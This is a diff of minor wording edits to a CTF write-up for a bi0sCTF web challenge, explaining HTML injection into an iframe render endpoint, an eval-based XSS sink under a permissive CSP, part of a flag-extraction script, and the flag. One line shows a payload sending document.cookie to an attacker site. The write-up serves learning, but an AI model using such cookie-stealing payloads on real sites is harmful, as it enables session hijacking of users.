@@ -100,7 +100,7 @@ document.addEventListener("DOMContentLoaded", async function() {
 
 In the user.js file the code is pretty much initianated by the `/report` endpoint when the admin bot looks up a username reported `/users?name=...` .
 It reads the name part of `/users?name=...` then fetches user JSON data. For each user object in the response , it loops through all the keys in the user object `bio` `username`. Then builds a key:value string like `bio=hello` and `username=soutag` and uses `encodeURI `method to remove certain special characters. 
-It also removes `&` charaters with `.replaceAll('&','')`. forms a query param by joining all the key value pairs with & . Then creates an **`<Iframe>`** that has a `src` of the` /render?` endpoint.  The result : `<iframe src="/render?bio=hello&username=alice"></iframe>` .  Renders the Iframe to the users.html page.
+It also removes `&` charaters with `.replaceAll('&','')`. forms a query param by joining all the key value pairs with & . Then creates an **`<Iframe>`** that has a `src` of the` /render?` endpoint.  The result : `<iframe src="/render?bio=hello&username=soutag"></iframe>` .  Renders the Iframe to the users.html page.
 
 The last part of the code has an interesting XSS sink. 
 If the main window object name has the name **Admin** and a query param like this `?js=PAYLOAD ` It will get evaled and executed the payload. The CSP also allows `unsafe-eval` 
@@ -142,7 +142,7 @@ to /update_bio we should be able to succesfully inject Html that will render whe
 ![Alt text for the image](./htmlinjection.png)
 
 
-Great! Now we have html injection and can try to achive XSS. 
+Great! Now we have html injection and can try to achieve XSS. 
 Also it doesnt matter what order you send the JSON payload in. The render endpoint will always take the injected `&bio=payload` over the `bio`
 because apparently [MongoDB sort keys lexicographically](https://www.mongodb.com/community/forums/t/mongodb-alphabetical-sorting/179702)
 
@@ -194,7 +194,7 @@ import threading
 import requests
 import time
 
-url = "https://your.ctf.site"  # Fill in the real URL
+url = "https://ctf.site"  # Fill in the real URL
 flag = [''] * 50
 flag_lock = threading.Lock()
 
@@ -253,7 +253,7 @@ flag=bi0sc
 
 Flag: `bi0sCTF{i_d0n't_f1nd_bugs!!_bug5_f1nd_m3:)}`
 
-After the ctf was over i released I could of used the JS injection to change the top level navigation to send a fetch request to our server with the cookie in it like this :` ?js=top location= "oursite.com?c=(document.cookie)"`. Someone else also used [webrtc to bypass the csp ](https://www.youtube.com/watch?v=sAmJ3Ypbosw) which was really clever!
+After the ctf was over I released I could of used the JS injection to change the top level navigation to send a fetch request to our server with the cookie in it like this :` ?js=top location= "oursite.com?c=(document.cookie)"`. Someone else also used [webrtc to bypass the csp ](https://www.youtube.com/watch?v=sAmJ3Ypbosw) which was really clever!
 
 
 # Revenge challenge intended solution
